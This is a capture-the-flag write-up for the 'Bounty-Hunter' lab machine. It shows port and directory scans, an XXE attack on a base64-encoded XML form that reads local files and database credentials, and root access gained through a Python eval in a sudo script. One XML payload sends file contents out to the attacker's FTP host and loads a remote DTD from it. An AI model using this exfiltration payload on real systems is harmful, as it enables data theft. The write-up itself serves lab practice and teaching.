# Bounty-Hunter

Starting with nmap scan to discover active ports and service versions:

```python
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 23:04 -03
Nmap scan report for 10.10.11.100
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Directory scan:

```python
===============================================================
2021/07/24 23:08:43 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 281]
/.hta                 (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/assets               (Status: 301) [Size: 321] [--> http://bountyhunter.htb/assets/]
/css                  (Status: 301) [Size: 318] [--> http://bountyhunter.htb/css/]   
/index.php            (Status: 200) [Size: 25169]                                    
/js                   (Status: 301) [Size: 317] [--> http://bountyhunter.htb/js/]    
/resources            (Status: 301) [Size: 324] [--> http://bountyhunter.htb/resources/]
/server-status        (Status: 403) [Size: 281]
/db.php
/portal.php
                                         
===============================================================
```

First contact with the application:

![Bounty-Hunter/Untitled.png](Bounty-Hunter/Untitled.png)

Resources page:

![Bounty-Hunter/Untitled%201.png](Bounty-Hunter/Untitled%201.png)

![Bounty-Hunter/Untitled%202.png](Bounty-Hunter/Untitled%202.png)

The payload with html encode bypass the filters allowing command injection:

![Bounty-Hunter/Untitled%203.png](Bounty-Hunter/Untitled%203.png)

Working well:

Testing website i could realize that some characters are filtered:

```python
filtered:
<, &, 

allowed:
>, ;, |, +, -, (), "a", #a, /*aa*/
```

![Bounty-Hunter/Untitled%204.png](Bounty-Hunter/Untitled%204.png)

Analyzing requests we can define what occurred in web application, it receives XML data encoded in base64, maybe creating new XML entity returning local files and calling XML entity in tags already existing.

Intercepting request with BurpSuite we can get a better overview: 

![Bounty-Hunter/Untitled%205.png](Bounty-Hunter/Untitled%205.png)

But the problem here is it, the code stay weird, But the problem is that the Base64 are URL encoded with signals (+ and =) to %2B and %3B %B, just change it to working decode.

![Bounty-Hunter/Untitled%206.png](Bounty-Hunter/Untitled%206.png)

Changing %2B to +:

![Bounty-Hunter/Untitled%207.png](Bounty-Hunter/Untitled%207.png)

Beautiful decode:

![Bounty-Hunter/Untitled%208.png](Bounty-Hunter/Untitled%208.png)

Now we will insert XML entity to return local files and calling function in title tag: This is a XXE attack.

![Bounty-Hunter/Untitled%209.png](Bounty-Hunter/Untitled%209.png)

Encoding again but remember, change the = %3B and + signal to %2B

![Bounty-Hunter/Untitled%2010.png](Bounty-Hunter/Untitled%2010.png)

In the BurpSuite to facility your life, use shortcuts CTRL + B to encode base64 and CTRL + U to URL encode. 

## XXE WORK!

![Bounty-Hunter/Untitled%2011.png](Bounty-Hunter/Untitled%2011.png)

The users existing with /bin/bash are development and root, now we search the id_rsa key to login.

![Bounty-Hunter/Untitled%2012.png](Bounty-Hunter/Untitled%2012.png)

Testing ftp connection with server using the XML:

```python
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://test:%file;@10.10.14.169:443/'>"> %all;

<!DOCTYPE svg [
<!ENTITY % file SYSTEM "file:///">
<!ENTITY % dtd SYSTEM "http://10.10.14.169:8000/remote_ftp.dtd"> %dtd;]>

```

I tried receive connections from ftp server and NetCat server 

![Bounty-Hunter/Untitled%2013.png](Bounty-Hunter/Untitled%2013.png)

Searching more, the db.php file contains the database credentials, just take this credentials and login in the machine with the user development. 

![Bounty-Hunter/Untitled%2014.png](Bounty-Hunter/Untitled%2014.png)

Size 0 because the code doesn't have HTML to return in request just PHP.

![Bounty-Hunter/Untitled%2015.png](Bounty-Hunter/Untitled%2015.png)

Sudo -l command shows the binary that is exploitable, you must have to do a boolean logic to give the root user.

The logic to privilege escalation, basically it contains a logic to pass the if statements and the last logic has a eval function, we can try execute code with it.

![Bounty-Hunter/Untitled%2016.png](Bounty-Hunter/Untitled%2016.png)

When you run, it returns the root shell.

I wrote a article talking more about this: [https://sidhawks.medium.com/exploração-python-eval-function-25162ee2f093](https://sidhawks.medium.com/explora%C3%A7%C3%A3o-python-eval-function-25162ee2f093)